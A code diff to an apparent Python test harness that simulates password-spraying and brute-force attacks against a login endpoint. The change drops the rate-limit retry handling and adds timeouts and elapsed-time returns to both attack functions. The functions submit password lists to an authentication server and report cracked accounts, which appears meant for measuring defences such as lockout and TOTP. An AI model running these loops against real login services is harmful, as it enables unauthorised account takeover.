@@ -74,21 +74,6 @@ def handle_defense_response(
         # Recursively handle any additional defenses
         return handle_defense_response(session, server_url, username, password, retry_response, endpoint)
 
-    # Handle rate limiting
-    if data.get("retry_after") is not None:
-        retry_after = data.get("retry_after")
-        print(f"[!] Rate limited for '{username}' - retry after {retry_after:.2f} seconds")
-        print(f"[*] Waiting {retry_after:.2f} seconds...")
-        time.sleep(retry_after)
-
-        # Retry after waiting
-        retry_response = session.post(
-            f"{server_url}{endpoint}",
-            json={"username": username, "password": password}
-        )
-        # Recursively handle any additional defenses
-        return handle_defense_response(session, server_url, username, password, retry_response, endpoint)
-
     # Handle account lockout
     if data.get("locked_until_seconds") is not None:
         locked_seconds = data.get("locked_until_seconds")
@@ -111,6 +96,8 @@ def password_spraying(
     usernames: List[str],
     endpoint: str = "/login",
     password_limit: int = const.DEFAULT_PASSWORD_LIMIT,
+    timeout_seconds: int = const.ATTACK_TIMEOUT,
+    start_time: float = None,
 ):
     """
     Simulate a password spraying attack.
@@ -123,6 +110,8 @@ def password_spraying(
     :param usernames: List of usernames to target
     :param endpoint: Login endpoint to target
     :param password_limit: Maximum number of passwords to try (None for no limit)
+    :param timeout_seconds: Maximum time in seconds before terminating attack (default: const.ATTACK_TIMEOUT)
+    :param start_time: Optional scenario start time to track time across multiple attacks
     """
     passwords = load_passwords_from_file()
 
@@ -134,12 +123,31 @@ def password_spraying(
     print(f"[*] Target: {server_url}{endpoint}")
     print(f"[*] Testing {len(passwords)} passwords against {len(usernames)} users")
     print(f"[*] Total attempts: {len(passwords) * len(usernames)}")
+    print(f"[*] Attack timeout: {timeout_seconds} seconds ({timeout_seconds / 60:.1f} minutes)")
+
     session = requests.Session()
+    if start_time is None:
+        start_time = time.time()
+
     # Try each password against all users
     for password in passwords:
-        print(f"\n[*] Trying password: '{password}'")
+        # Check if timeout exceeded
+        elapsed_time = time.time() - start_time
+        if elapsed_time >= timeout_seconds:
+            print(f"\n[!] Attack timeout reached ({elapsed_time:.1f} seconds)")
+            print(f"[!] Terminating password spraying attack")
+            return elapsed_time
+
+        print(f"\n[*] Trying password: '{password}' (Elapsed: {elapsed_time:.1f}s)")
 
         for username in usernames:
+            # Check timeout before each attempt
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= timeout_seconds:
+                print(f"\n[!] Attack timeout reached ({elapsed_time:.1f} seconds)")
+                print(f"[!] Terminating password spraying attack")
+                return elapsed_time
+
             try:
                 print(f"[*] Trying user: '{username}'")
                 response = session.post(
@@ -166,7 +174,9 @@ def password_spraying(
             except requests.exceptions.RequestException as e:
                 print(f"[!] Error connecting to server: {e}")
 
-    print(f"\n[*] Attack completed")
+    elapsed_time = time.time() - start_time
+    print(f"\n[*] Attack completed (Elapsed: {elapsed_time:.1f}s)")
+    return elapsed_time
 
 
 def brute_force_attack(
@@ -174,18 +184,22 @@ def brute_force_attack(
     target_username: str,
     max_attempts: int = None,
     endpoint: str = "/login",
-    password_list: List[str] = None
+    password_list: List[str] = None,
+    timeout_seconds: int = const.ATTACK_TIMEOUT,
+    start_time: float = None,
 ):
     """
     Simulate a brute force attack against a specific user.
-    
+
     Tries many passwords against a single user account. This is more aggressive
     but more likely to trigger rate limiting mechanisms.
-    
+
     :param server_url: Base URL of the authentication server (e.g., "http://localhost:8000")
     :param target_username: Username to target
     :param password_list: List of passwords to try (defaults to COMMON_PASSWORDS + generated variations)
     :param max_attempts: Maximum number of attempts before stopping (None for unlimited)
+    :param timeout_seconds: Maximum time in seconds before terminating attack (default: const.ATTACK_TIMEOUT)
+    :param start_time: Optional scenario start time to track time across multiple attacks
     """
     if password_list is None:
         # Use common passwords plus some variations
@@ -198,16 +212,28 @@ def brute_force_attack(
             if pwd not in seen:
                 seen.add(pwd)
                 password_list.append(pwd)
-    
+
     login_url = f"{server_url}{endpoint}"
 
     print(f"[*] Starting brute force attack")
     print(f"[*] Target: {server_url}")
     print(f"[*] Target username: '{target_username}'")
     print(f"[*] Password list size: {len(password_list)}")
+    print(f"[*] Attack timeout: {timeout_seconds} seconds ({timeout_seconds / 60:.1f} minutes)")
+
     session = requests.Session()
+    if start_time is None:
+        start_time = time.time()
     attempts = 0
+
     for i, password in enumerate(password_list, 1):
+        # Check if timeout exceeded
+        elapsed_time = time.time() - start_time
+        if elapsed_time >= timeout_seconds:
+            print(f"\n[!] Attack timeout reached ({elapsed_time:.1f} seconds)")
+            print(f"[!] Terminating brute force attack after {attempts} attempts")
+            return elapsed_time
+
         # Check if we've reached max_attempts
         if max_attempts and attempts >= max_attempts:
             print(f"\n[*] Reached maximum attempts limit ({max_attempts})")
@@ -236,17 +262,21 @@ def brute_force_attack(
                 if data.get("status") == "success":
                     print(f"\n[+] SUCCESS! Password found: '{password}'")
                     print(f"[+] Cracked {target_username} after {attempts} attempts")
-                    return
+                    elapsed_time = time.time() - start_time
+                    return elapsed_time
                 elif data.get("totp_required"):
                     print(f"\n[+] PASSWORD FOUND! '{password}' (TOTP enabled)")
                     print(f"[+] Cracked {target_username} password after {attempts} attempts")
-                    return
+                    elapsed_time = time.time() - start_time
+                    return elapsed_time
 
         except requests.exceptions.RequestException as e:
             print(f"[!] Error connecting to server: {e}")
 
-    print(f"\n[*] Attack completed")
+    elapsed_time = time.time() - start_time
+    print(f"\n[*] Attack completed (Elapsed: {elapsed_time:.1f}s)")
     print(f"[*] Password NOT found after {attempts} attempts")
+    return elapsed_time
 
 
 def _generate_password_variations(username: str = None) -> List[str]:
